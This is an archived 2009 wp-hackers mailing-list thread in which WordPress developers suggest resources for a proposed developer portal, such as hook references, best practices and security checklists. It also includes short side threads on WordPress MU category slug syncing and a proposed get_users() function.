In-Reply-To: <4B22AD95.8040401@mullenweg.com>
References: <4B22AD95.8040401@mullenweg.com>
Message-ID: <bc45bff60912111244m20a1a8abr551c28de8fd6b3e4@mail.gmail.com>

- Comprehensive guide on how to build themes
- Comprehensive guide on how to write plugins - by making a sample
something, ie. step-by-step - what to consider, what is possible
- Tips to disable everything that makes WP run slow ?.?

m.

On Fri, Dec 11, 2009 at 3:37 PM, Matt Mullenweg <m at mullenweg.com> wrote:

> If there were to be a developer portal for WordPress, someplace where if
> you're first getting started with hacking on WP, building plugins, creating
> themes, you could go and it'd have all the best resources in one place, what
> resources do you think would be important to have there?
>
> What do you wish you had when you first started developing for WordPress?
>
> (Bonus points if it's something that already exists, just scattered around.
> :))
>
> --
> Matt Mullenweg
> http://ma.tt | http://wordpress.org | http://automattic.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mpretty at voceconnect.com  Fri Dec 11 20:48:53 2009
From: mpretty at voceconnect.com (Michael Pretty)
Date: Fri, 11 Dec 2009 15:48:53 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B22AD95.8040401@mullenweg.com>
References: <4B22AD95.8040401@mullenweg.com>
Message-ID: <4B22B035.8070408@voceconnect.com>

Things that would have helped me in the beginning:
1.  Links to the WP irc rooms.
2.  A trusted resource for plugins that show good development practices 
(hopefully what core plugins will provide)

This may exist, but it wasn't something I found 3 years ago when I 
needed it most.

Matt Mullenweg wrote:
> If there were to be a developer portal for WordPress, someplace where 
> if you're first getting started with hacking on WP, building plugins, 
> creating themes, you could go and it'd have all the best resources in 
> one place, what resources do you think would be important to have there?
>
> What do you wish you had when you first started developing for WordPress?
>
> (Bonus points if it's something that already exists, just scattered 
> around. :))
>


From batmoo at gmail.com  Fri Dec 11 20:49:15 2009
From: batmoo at gmail.com (Mohammad Jangda)
Date: Fri, 11 Dec 2009 15:49:15 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B22AD95.8040401@mullenweg.com>
References: <4B22AD95.8040401@mullenweg.com>
Message-ID: <eaaa36c90912111249x36819968i46c1c0713420c190@mail.gmail.com>

>
> What do you wish you had when you first started developing for WordPress?



From bradw at illiams.com  Fri Dec 11 20:51:39 2009
From: bradw at illiams.com (Brad Williams)
Date: Fri, 11 Dec 2009 15:51:39 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <eaaa36c90912111249x36819968i46c1c0713420c190@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com>
	<eaaa36c90912111249x36819968i46c1c0713420c190@mail.gmail.com>
Message-ID: <003c01ca7aa3$bce320a0$36a961e0$@com>

I think hooks (both Actions and Filters) are one of the hardest things to
find when first starting.  I would imagine most of us on this list learned
hooks by looking at other plugins.  Would be nice to have a solid resource
just for that


-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Mohammad
Jangda
Sent: Friday, December 11, 2009 3:49 PM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Developer portal

>
> What do you wish you had when you first started developing for WordPress?



From ian at themeshaper.com  Fri Dec 11 20:54:41 2009
From: ian at themeshaper.com (Ian Stewart)
Date: Fri, 11 Dec 2009 14:54:41 -0600
Subject: [wp-hackers] Developer portal
In-Reply-To: <003c01ca7aa3$bce320a0$36a961e0$@com>
References: <4B22AD95.8040401@mullenweg.com>
	<eaaa36c90912111249x36819968i46c1c0713420c190@mail.gmail.com> 
	<003c01ca7aa3$bce320a0$36a961e0$@com>
Message-ID: <a8405fa30912111254ud3208a4r6c87ca0b6a931fa6@mail.gmail.com>

- Links to coding style guides everywhere, just up to the point of
ridiculousness. It'd be nice to have that extra level of confidence when
you're branching out from an example.

On Fri, Dec 11, 2009 at 2:51 PM, Brad Williams <bradw at illiams.com> wrote:

> I think hooks (both Actions and Filters) are one of the hardest things to
> find when first starting.  I would imagine most of us on this list learned
> hooks by looking at other plugins.  Would be nice to have a solid resource
> just for that
>
>
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Mohammad
> Jangda
> Sent: Friday, December 11, 2009 3:49 PM
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] Developer portal
>
> >
> > What do you wish you had when you first started developing for WordPress?
>
>
> From a plugin devs perspective:
>
> I learned mostly by looking at the code for other high-profile plugins and
> core. But it'd be great to have a portal that combines all of the
> following:
>
>   - Up-to-date walkthroughs/tutorials all in one place (Codex has links to
>   various blog posts -- many are outdated)
>   - Sample code (scattered around on the Codex)
>   - Coding conventions (On the Codex)
>   - Downloadable plugin skeletons
>   - A complete/updated list of action/filter hooks with docs and links to
>   source in trac (http://adambrown.info/p/wp_hooks)
>   - PHPXref (http://xref.yoast.com/)
>   - A search engine like http://wplookup.com/
>   - A place where I can ask questions after I've spent 5 hours on a problem
>   and still can't figure out, only to realize that I forgot a semi-colon
> and
>   proceeding to *facepalm* (wp-hackers)
>
> --
> Mohammad Jangda
> www.digitalize.ca | @mjangda
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Ian Stewart

http://ThemeShaper.com/
http://twitter.com/iandstewart/
http://ianstewart.stumbleupon.com/

From matt at mattjacob.com  Fri Dec 11 20:56:10 2009
From: matt at mattjacob.com (Matt Jacob)
Date: Fri, 11 Dec 2009 13:56:10 -0700
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B22B035.8070408@voceconnect.com>
References: <4B22AD95.8040401@mullenweg.com> <4B22B035.8070408@voceconnect.com>
Message-ID: <410963320912111256v3b3d99bavee313977896c4287@mail.gmail.com>

On Fri, Dec 11, 2009 at 1:48 PM, Michael Pretty <mpretty at voceconnect.com> wrote:
> 2. ?A trusted resource for plugins that show good development practices
> (hopefully what core plugins will provide)

+1.

I'd love to see best practice examples of using all the major APIs.
Also, an integration guide of some sort would be great. It would have,
e.g., UI/UX conventions used throughout the admin interface, admin CSS
classes you could use (like a style guide), admin form layout and
messaging conventions, etc.

Matt

From Brian at TheCodeCave.com  Fri Dec 11 21:21:41 2009
From: Brian at TheCodeCave.com (Brian Layman)
Date: Fri, 11 Dec 2009 16:21:41 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B22AD95.8040401@mullenweg.com>
References: <4B22AD95.8040401@mullenweg.com>
Message-ID: <001301ca7aa7$ef137f80$cd3a7e80$@com>

> What do you wish you had when you first started developing for WordPress?
Plugin frameworks, basically examples of how to make the most common types
of plugins. It would be nice if this had a digg like interface to put
popular ones on top.  

Alternately a logic tree to build the initial plugin framework.

It would:
1. Fill in your name, site, and contact info upon your user profile.
2. Allow you to chose your prefered license 
3. Allow the selection of basic options like: filter post content, display a
widget, have a settings menu
4. Chose a basic coding style to use.

From aaron at jorb.in  Fri Dec 11 21:39:03 2009
From: aaron at jorb.in (Aaron Jorbin)
Date: Fri, 11 Dec 2009 13:39:03 -0800
Subject: [wp-hackers] Developer portal
In-Reply-To: <001301ca7aa7$ef137f80$cd3a7e80$@com>
References: <4B22AD95.8040401@mullenweg.com>
	<001301ca7aa7$ef137f80$cd3a7e80$@com>
Message-ID: <dc89e3ef0912111339g2ef4d6dfs3474153a323a034e@mail.gmail.com>

The one thing that I think is really lacking is a open source resource like
http://wp-roadmap.com/demo/?roadmap_version=2.8 that shows in order the
hooks and filters applied on each request that developers could download and
use on there own site.

http://aaron.jorb.in
twitter: twitter.com/aaronjorbin

From Brian at TheCodeCave.com  Fri Dec 11 21:39:00 2009
From: Brian at TheCodeCave.com (Brian Layman)
Date: Fri, 11 Dec 2009 16:39:00 -0500
Subject: [wp-hackers] WordPress MU Category Slugs
References: <5b1aecc0912071215idf05d7ei8bf9e4e80f562f2b@mail.gmail.com> 
Message-ID: <001401ca7aaa$5a22f5b0$0e68e110$@com>

There is code in WPMU that is there to further some non-standard WP features
(re: the whole site-category table). When importing all of the b5media sites
into MU, I had to disable all these because there were has some fundamental
flaws in the logic that we ran into very quickly due to the imports.  Mark
Jaquith and I spent hours going over the code and disabling it was the ideal
solution. I've not looked at it much since, so some core logic may have
change in the most recent version. I saw Donncha refer in that conversation
to tags, but when I was looking at it it very specifically only dealt with
categories and that was the problem.

In short, there is an attempt to give all categories the same IDs across the
board. In order for a category name to have the same meaning on one blog as
another, and the links match that meaning, the category name and category
slug had to be related. Normal WP sites don't have this restriction. So when
importing from a normal wp blog, the matching of slug and category can cause
problems.  e.g. If you ever edit a category and have the slug changed
without your consent, you will very quickly find your Google 404 listing
cranking up as your permalinks change even though you'd only made a change
to the category name or description.  

Additionally, because tags and cats both work off of term IDs and only
category ids were syncronized between blogs and because that syncronization
is based upon an autoinc field in the site_categories table, there are
problems. Collisions of the new syncronized category IDs and the more
rapidly increasing max termID on the individual blog (due to extensive tag
usage), are increasingly likely over time.  Once an individual blogs autoinc
termID is greater than the siteCategory's autoinc ID, you get key violations
that aren't handled well by the editor displayed only as "Cannot edit"
messages upon category edit.

To solve all of this, I disable both of these mu customizations with a
plugin that has these lines:
remove_filter ( 'term_id_filter', 'global_terms', 10, 2 );
remove_filter( 'get_term', 'sync_category_tag_slugs', 10, 2 );

YMMV et al

- brian layman

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Tim
Schoffelman
Sent: Monday, December 07, 2009 3:15 PM
To: wp-hackers at lists.automattic.com
Subject: [wp-hackers] WordPress MU Category Slugs

Just out of curiosity - was/is there a reason why WordPress MU doesn't allow
category slugs to be edited. I've looked through this conversation -
http://mu.wordpress.org/forums/topic/12258 - but I'm interested in any
additional thoughts.

~Tim
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers


From wp at xentek.net  Fri Dec 11 21:47:27 2009
From: wp at xentek.net (Eric Marden)
Date: Fri, 11 Dec 2009 16:47:27 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <bc45bff60912111244m20a1a8abr551c28de8fd6b3e4@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com>
	<bc45bff60912111244m20a1a8abr551c28de8fd6b3e4@mail.gmail.com>
Message-ID: <98B307B3-5232-4411-AE88-2F0217EDB107@xentek.net>

On Dec 11, 2009, at 3:44 PM, Melissa P. wrote:

> - Tips to disable everything that makes WP run slow


That's easy. Its your shared hosting provider. :p


- Eric Marden
__________________________________
http://xentek.net/code/wordpress/
tw: @xentek





From m at melz.org  Fri Dec 11 22:01:01 2009
From: m at melz.org (Melissa P.)
Date: Fri, 11 Dec 2009 17:01:01 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <98B307B3-5232-4411-AE88-2F0217EDB107@xentek.net>
References: <4B22AD95.8040401@mullenweg.com>
	<bc45bff60912111244m20a1a8abr551c28de8fd6b3e4@mail.gmail.com> 
	<98B307B3-5232-4411-AE88-2F0217EDB107@xentek.net>
Message-ID: <bc45bff60912111401s6638d12fu6536070240505ada@mail.gmail.com>

Actually I run WP on a very optimized VPS. But I still dislike the one
second pause (relatively speaking) before the main page loads or the
administration panel shows up. I just wish there's a way to disable every
silly feature that I don't need instead of hiding them from my view.

m.

On Fri, Dec 11, 2009 at 4:47 PM, Eric Marden <wp at xentek.net> wrote:

> On Dec 11, 2009, at 3:44 PM, Melissa P. wrote:
>
>  - Tips to disable everything that makes WP run slow
>>
>
>
> That's easy. Its your shared hosting provider. :p
>
>
> - Eric Marden
> __________________________________
> http://xentek.net/code/wordpress/
> tw: @xentek
>
>
>
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From batmoo at gmail.com  Fri Dec 11 22:12:59 2009
From: batmoo at gmail.com (Mohammad Jangda)
Date: Fri, 11 Dec 2009 17:12:59 -0500
Subject: [wp-hackers] get_users() function
Message-ID: <eaaa36c90912111412j1d88c3f2t31847282c934d8db@mail.gmail.com>

Are there any plans to add a get_users-like function to allow
easy retrieval of users based on different criteria? I've seen a few TODOs
in the core code that mention plans to replace some of the SQL queries
related to users with a get_users function but not much more than that.

The closest I've found so far are the wp_user_search class and
get_users_of_blog. The former only does a keyword style search and the
latter doesn't have any options other than blog_id.

For my specific use case (get a list of users based on a usermeta field), I
could very easily write an SQL query, but I'd like to avoid that and stick
to the WordPress API if at all possible. (Though, the wp_user_search class
is pluggable, so I could potentially just override that class).

It looks like this has come up before on wp-hackers (
http://groups.google.com/group/wp-hackers/browse_thread/thread/7e39fec401637f7e/fcf709dd033d78d6#fcf709dd033d78d6),
but there wasn't much discussion around that message. Any thoughts on having
this added to core?

I don't see a trac ticket, but if people think there's value in it, I can
add one.

--
Mohammad Jangda
www.digitalize.ca | @mjangda <http://twitter.com/mjangda>

From scribu at gmail.com  Fri Dec 11 22:30:37 2009
From: scribu at gmail.com (scribu)
Date: Sat, 12 Dec 2009 00:30:37 +0200
Subject: [wp-hackers] get_users() function
In-Reply-To: <eaaa36c90912111412j1d88c3f2t31847282c934d8db@mail.gmail.com>
References: <eaaa36c90912111412j1d88c3f2t31847282c934d8db@mail.gmail.com>
Message-ID: <349fe48b0912111430q357d7c25n2220889ee4a23dd3@mail.gmail.com>

get_users() would be a good ideea for 3.0, considering the merging with MU
and all.

One key criteria this function must have is the ability to get users by
role.

The function itself will probably call WP_User_Search internally.

So here's a related ticket:

http://core.trac.wordpress.org/ticket/10781


On Sat, Dec 12, 2009 at 12:12 AM, Mohammad Jangda <batmoo at gmail.com> wrote:

> Are there any plans to add a get_users-like function to allow
> easy retrieval of users based on different criteria? I've seen a few TODOs
> in the core code that mention plans to replace some of the SQL queries
> related to users with a get_users function but not much more than that.
>
> The closest I've found so far are the wp_user_search class and
> get_users_of_blog. The former only does a keyword style search and the
> latter doesn't have any options other than blog_id.
>
> For my specific use case (get a list of users based on a usermeta field), I
> could very easily write an SQL query, but I'd like to avoid that and stick
> to the WordPress API if at all possible. (Though, the wp_user_search class
> is pluggable, so I could potentially just override that class).
>
> It looks like this has come up before on wp-hackers (
>
> http://groups.google.com/group/wp-hackers/browse_thread/thread/7e39fec401637f7e/fcf709dd033d78d6#fcf709dd033d78d6
> ),
> but there wasn't much discussion around that message. Any thoughts on
> having
> this added to core?
>
> I don't see a trac ticket, but if people think there's value in it, I can
> add one.
>
> --
> Mohammad Jangda
> www.digitalize.ca | @mjangda <http://twitter.com/mjangda>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
http://scribu.net

From dougal at gunters.org  Fri Dec 11 23:07:53 2009
From: dougal at gunters.org (Dougal Campbell)
Date: Fri, 11 Dec 2009 18:07:53 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B22B035.8070408@voceconnect.com>
References: <4B22AD95.8040401@mullenweg.com> <4B22B035.8070408@voceconnect.com>
Message-ID: <4B22D0C9.4080607@gunters.org>

On Dec 11 2009 3:48 PM, Michael Pretty wrote:
> Things that would have helped me in the beginning:
> 1.  Links to the WP irc rooms.

Speaking of which, it would be helpful if the WordPress Development 
Updates blog (http://wpdevel.wordpress.com/) had some persistent 
information at the top of the page telling the times for the chats 
(21:00 UTC / 16:00 EST), the server (irc.freenode.net), and the channel 
(#wordpress-dev).

-- 
Dougal Campbell <dougal at gunters.org>
http://dougal.gunters.org/
http://twitter.com/dougal
http://twitual.com/

From beau at dentedreality.com.au  Fri Dec 11 23:33:20 2009
From: beau at dentedreality.com.au (Beau Lebens)
Date: Fri, 11 Dec 2009 20:33:20 -0300
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B22D0C9.4080607@gunters.org>
References: <4B22AD95.8040401@mullenweg.com> <4B22B035.8070408@voceconnect.com>
	<4B22D0C9.4080607@gunters.org>
Message-ID: <902424490912111533x5928593dy5264c78c062f07ed@mail.gmail.com>

> Speaking of which, it would be helpful if the WordPress Development Updates
> blog (http://wpdevel.wordpress.com/) had some persistent information at the
> top of the page telling the times for the chats (21:00 UTC / 16:00 EST), the
> server (irc.freenode.net), and the channel (#wordpress-dev).

Good idea -- done.

From dougal at gunters.org  Fri Dec 11 23:49:15 2009
From: dougal at gunters.org (Dougal Campbell)
Date: Fri, 11 Dec 2009 18:49:15 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B22AD95.8040401@mullenweg.com>
References: <4B22AD95.8040401@mullenweg.com>
Message-ID: <4B22DA7B.40808@gunters.org>

On Dec 11 2009 3:37 PM, Matt Mullenweg wrote:
> If there were to be a developer portal for WordPress, someplace where 
> if you're first getting started with hacking on WP, building plugins, 
> creating themes, you could go and it'd have all the best resources in 
> one place, what resources do you think would be important to have there?
>
> What do you wish you had when you first started developing for WordPress?
>
> (Bonus points if it's something that already exists, just scattered 
> around. :))

Some really detailed information on Best Practices for both plugins and 
themes, as well as for submitting core patches to Trac.

The Best Practices guidelines for plugins would probably cover things like:
  * Separating back-end and front-end code so that you don't load the 
entire plugin on every page request.
  * How to use a class to encapsulate code, how to instantiate a class 
object from a hook, and how to pass class methods to action/filter hooks.
  * Checking user capabilities for security. Pointers to specific 
capabilities.
  * Using the object class functions for data that might benefit from it 
(and some examples of what kinds of data would benefit from it).
  * Using the nonce functions and other admin option page helper functions.
  * All the new escaping functions for URLs, attributes, javascript, and 
other values.
  * Translation functions for fixed strings and how to set up the plugin 
textdomain.
  * Other stuff I don't have time to enumerate right now, because I'm 
about to leave with my wife for her office Christmas party. :)

-- 
Dougal Campbell <dougal at gunters.org>
http://dougal.gunters.org/
http://twitter.com/dougal
http://twitual.com/

From james at om4.com.au  Sat Dec 12 04:03:17 2009
From: james at om4.com.au (James Collins)
Date: Sat, 12 Dec 2009 15:03:17 +1100
Subject: [wp-hackers] Developer portal
In-Reply-To: <902424490912111533x5928593dy5264c78c062f07ed@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com> <4B22B035.8070408@voceconnect.com>
	<4B22D0C9.4080607@gunters.org>
	<902424490912111533x5928593dy5264c78c062f07ed@mail.gmail.com>
Message-ID: <bcf8d3150912112003t5421c2c7vbf9b573203ec691c@mail.gmail.com>

Beau,

Thanks for doing that. It's probably a good idea to mention that the chats
are on Thursdays as well.

Regards,

James Collins

OM4 - Website Design and Development
OM4.com.au | OM4Tourism.com



2009/12/12 Beau Lebens <beau at dentedreality.com.au>

> > Speaking of which, it would be helpful if the WordPress Development
> Updates
> > blog (http://wpdevel.wordpress.com/) had some persistent information at
> the
> > top of the page telling the times for the chats (21:00 UTC / 16:00 EST),
> the
> > server (irc.freenode.net), and the channel (#wordpress-dev).
>
> Good idea -- done.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From info at toscho.de  Sat Dec 12 05:07:00 2009
From: info at toscho.de (Thomas Scholz)
Date: Sat, 12 Dec 2009 06:07:00 +0100
Subject: [wp-hackers] Developer portal
In-Reply-To: <4B22AD95.8040401@mullenweg.com>
References: <4B22AD95.8040401@mullenweg.com>
Message-ID: <op.u4s65yocr6yny2@toscho.de>

Matt Mullenweg:

> If there were to be a developer portal for WordPress, someplace where if  
> you're first getting started with hacking on WP, building plugins,  
> creating themes, you could go and it'd have all the best resources in  
> one place, what resources do you think would be important to have there?
>
> What do you wish you had when you first started developing for WordPress?

Something like the PHP Manual: Extended information for all functions and  
classes with examples and user notes. Oh, and feeds for everything. :)

Thomas

-- 
Redaktion, Druck- und Webdesign
http://toscho.de ? 0160/1764727
Twitter: @toscho

From beau at dentedreality.com.au  Sat Dec 12 06:09:43 2009
From: beau at dentedreality.com.au (Beau Lebens)
Date: Sat, 12 Dec 2009 03:09:43 -0300
Subject: [wp-hackers] Developer portal
In-Reply-To: <bcf8d3150912112003t5421c2c7vbf9b573203ec691c@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com> <4B22B035.8070408@voceconnect.com>
	<4B22D0C9.4080607@gunters.org>
	<902424490912111533x5928593dy5264c78c062f07ed@mail.gmail.com>
	<bcf8d3150912112003t5421c2c7vbf9b573203ec691c@mail.gmail.com>
Message-ID: <902424490912112209u6c6219fbpe2b117a6b7d77d2e@mail.gmail.com>

> Thanks for doing that. It's probably a good idea to mention that the chats
> are on Thursdays as well.

LOL, good point, oops. Updated.

From frank at bueltge.de  Sat Dec 12 09:19:44 2009
From: frank at bueltge.de (Frank Bueltge)
Date: Sat, 12 Dec 2009 10:19:44 +0100
Subject: [wp-hackers] Developer portal
In-Reply-To: <902424490912112209u6c6219fbpe2b117a6b7d77d2e@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com>
	<4B22B035.8070408@voceconnect.com> <4B22D0C9.4080607@gunters.org>
	<902424490912111533x5928593dy5264c78c062f07ed@mail.gmail.com> 
	<bcf8d3150912112003t5421c2c7vbf9b573203ec691c@mail.gmail.com> 
	<902424490912112209u6c6219fbpe2b117a6b7d77d2e@mail.gmail.com>
Message-ID: <db047a770912120119u2fa39a82t2518e1f1af164761@mail.gmail.com>

A actual documentation for functions, classes and constants; place for
discussion on the entries and a feed for different tags/categories;
icluding from entries of other sites, maybe tutorials - the web has so
many good sites with great examples
A search engine, like http://wpseek.com

http://bueltge.de : frank at bueltge.de
http://wpengineer.com : frank at wpengineer.com



On Sat, Dec 12, 2009 at 7:09 AM, Beau Lebens <beau at dentedreality.com.au> wrote:
>> Thanks for doing that. It's probably a good idea to mention that the chats
>> are on Thursdays as well.
>
> LOL, good point, oops. Updated.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From ben at thewhiteroom.net  Sat Dec 12 10:21:59 2009
From: ben at thewhiteroom.net (Ben Huson)
Date: Sat, 12 Dec 2009 10:21:59 +0000
Subject: [wp-hackers] Developer portal
In-Reply-To: <db047a770912120119u2fa39a82t2518e1f1af164761@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com> <4B22B035.8070408@voceconnect.com>
	<4B22D0C9.4080607@gunters.org>
	<902424490912111533x5928593dy5264c78c062f07ed@mail.gmail.com>
	<bcf8d3150912112003t5421c2c7vbf9b573203ec691c@mail.gmail.com>
	<902424490912112209u6c6219fbpe2b117a6b7d77d2e@mail.gmail.com>
	<db047a770912120119u2fa39a82t2518e1f1af164761@mail.gmail.com>
Message-ID: <d863c64e0912120221h24ffa2ai80ebc62db1695f42@mail.gmail.com>

A definitive list of Hooks and filters - I know there are some sites
out there but they don't have great documentation and usage examples

- Ben

2009/12/12 Frank Bueltge <frank at bueltge.de>:
> A actual documentation for functions, classes and constants; place for
> discussion on the entries and a feed for different tags/categories;
> icluding from entries of other sites, maybe tutorials - the web has so
> many good sites with great examples
> A search engine, like http://wpseek.com
>
> http://bueltge.de : frank at bueltge.de
> http://wpengineer.com : frank at wpengineer.com
>
>
>
> On Sat, Dec 12, 2009 at 7:09 AM, Beau Lebens <beau at dentedreality.com.au> wrote:
>>> Thanks for doing that. It's probably a good idea to mention that the chats
>>> are on Thursdays as well.
>>
>> LOL, good point, oops. Updated.
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From piemanek at gmail.com  Sat Dec 12 16:07:17 2009
From: piemanek at gmail.com (Simon Blackbourn)
Date: Sat, 12 Dec 2009 16:07:17 +0000
Subject: [wp-hackers] Developer portal
In-Reply-To: <d863c64e0912120221h24ffa2ai80ebc62db1695f42@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com> <4B22B035.8070408@voceconnect.com>
	<4B22D0C9.4080607@gunters.org>
	<902424490912111533x5928593dy5264c78c062f07ed@mail.gmail.com>
	<bcf8d3150912112003t5421c2c7vbf9b573203ec691c@mail.gmail.com>
	<902424490912112209u6c6219fbpe2b117a6b7d77d2e@mail.gmail.com>
	<db047a770912120119u2fa39a82t2518e1f1af164761@mail.gmail.com>
	<d863c64e0912120221h24ffa2ai80ebc62db1695f42@mail.gmail.com>
Message-ID: <65b196650912120807l3458f765of3af33905e46920@mail.gmail.com>

A whole section on plugin security (using wp_nonce, avoiding xss, things to
be aware of when handling user input, etc.).

A lot of this is not specific to WordPress of course, but I think a lot of
self-taught coders (myself included) really first got to grips with PHP
through writing WordPress plugins and themes.

An easy to follow security checklist, plus other WordPress-specific info,
plus links to existing security resources online would have been very
welcome.

Simon

From patrik.bona at mrhead.sk  Sat Dec 12 16:11:44 2009
From: patrik.bona at mrhead.sk (=?ISO-8859-1?Q?Patrik_B=F3na?=)
Date: Sat, 12 Dec 2009 17:11:44 +0100
Subject: [wp-hackers] Developer portal
In-Reply-To: <65b196650912120807l3458f765of3af33905e46920@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com>
	<4B22B035.8070408@voceconnect.com>	<4B22D0C9.4080607@gunters.org>	<902424490912111533x5928593dy5264c78c062f07ed@mail.gmail.com>	<bcf8d3150912112003t5421c2c7vbf9b573203ec691c@mail.gmail.com>	<902424490912112209u6c6219fbpe2b117a6b7d77d2e@mail.gmail.com>	<db047a770912120119u2fa39a82t2518e1f1af164761@mail.gmail.com>	<d863c64e0912120221h24ffa2ai80ebc62db1695f42@mail.gmail.com>
	<65b196650912120807l3458f765of3af33905e46920@mail.gmail.com>
Message-ID: <4B23C0C0.7020408@mrhead.sk>

+1 for this!

Security checklist is very good idea.

Simon Blackbourn wrote:
> A whole section on plugin security (using wp_nonce, avoiding xss, things to
> be aware of when handling user input, etc.).
>
> A lot of this is not specific to WordPress of course, but I think a lot of
> self-taught coders (myself included) really first got to grips with PHP
> through writing WordPress plugins and themes.
>
> An easy to follow security checklist, plus other WordPress-specific info,
> plus links to existing security resources online would have been very
> welcome.
>
> Simon
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>   


From office at wpseek.com  Sat Dec 12 16:57:15 2009
From: office at wpseek.com (=?ISO-8859-1?Q?Oliver_Schl=F6be?=)
Date: Sat, 12 Dec 2009 17:57:15 +0100
Subject: [wp-hackers] Developer portal
In-Reply-To: <65b196650912120807l3458f765of3af33905e46920@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com>
	<4B22B035.8070408@voceconnect.com>	<4B22D0C9.4080607@gunters.org>	<902424490912111533x5928593dy5264c78c062f07ed@mail.gmail.com>	<bcf8d3150912112003t5421c2c7vbf9b573203ec691c@mail.gmail.com>	<902424490912112209u6c6219fbpe2b117a6b7d77d2e@mail.gmail.com>	<db047a770912120119u2fa39a82t2518e1f1af164761@mail.gmail.com>	<d863c64e0912120221h24ffa2ai80ebc62db1695f42@mail.gmail.com>
	<65b196650912120807l3458f765of3af33905e46920@mail.gmail.com>
Message-ID: <4B23CB6B.9070907@wpseek.com>

Though it's not exactly a security checklist, there's a great resource 
in the Codex, covering Data Validation, User input handling etc: 
http://codex.wordpress.org/Data_Validation

-- 
Regards,
Oliver Schl?be

http://wpseek.com/
http://wpworldmap.net/



On 12.12.2009 17:07, Simon Blackbourn wrote:
> A whole section on plugin security (using wp_nonce, avoiding xss, things to
> be aware of when handling user input, etc.).
>
> A lot of this is not specific to WordPress of course, but I think a lot of
> self-taught coders (myself included) really first got to grips with PHP
> through writing WordPress plugins and themes.
>
> An easy to follow security checklist, plus other WordPress-specific info,
> plus links to existing security resources online would have been very
> welcome.
>
> Simon
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>    

From mwalters8 at gmail.com  Sat Dec 12 18:05:19 2009
From: mwalters8 at gmail.com (Matt Walters)
Date: Sat, 12 Dec 2009 13:05:19 -0500
Subject: [wp-hackers] Developer portal
In-Reply-To: <65b196650912120807l3458f765of3af33905e46920@mail.gmail.com>
References: <4B22AD95.8040401@mullenweg.com>
	<4B22B035.8070408@voceconnect.com> <4B22D0C9.4080607@gunters.org>
	<902424490912111533x5928593dy5264c78c062f07ed@mail.gmail.com> 
	<bcf8d3150912112003t5421c2c7vbf9b573203ec691c@mail.gmail.com> 
	<902424490912112209u6c6219fbpe2b117a6b7d77d2e@mail.gmail.com> 
	<db047a770912120119u2fa39a82t2518e1f1af164761@mail.gmail.com> 
	<d863c64e0912120221h24ffa2ai80ebc62db1695f42@mail.gmail.com> 
	<65b196650912120807l3458f765of3af33905e46920@mail.gmail.com>
Message-ID: <5dbff0c70912121005i85eac90qbab7df7463d03df6@mail.gmail.com>

On Sat, Dec 12, 2009 at 11:07 AM, Simon Blackbourn <piemanek at gmail.com> wrote:
> A whole section on plugin security (using wp_nonce, avoiding xss, things to
> be aware of when handling user input, etc.).

[...]

> An easy to follow security checklist, plus other WordPress-specific info,
> plus links to existing security resources online would have been very
> welcome.


+1 -- A central place that had the current best practices for security
in wordpress (including references to the escaping functions that WP
provides) would be great.  I know some folks like Mark and others work
hard on getting this information out there, but if you're new to
WordPress, you may not know he's someone you want to look up for
security info.

Also, and this was noted elsewhere I believe, I really like the
php.net documentation.  Something similar for WordPress where I could
load up worddpress.org/code/get_posts (or whatever URL) and
automatically pull up the parameters, syntax, etc, would be really
valuable to both new WordPress dev's as well as those of us that don't
use one of the functions for a month and then all of the sudden need
it for a project.  Even better if it also had the section, like on
php.net, where it suggested other functions you might be interested
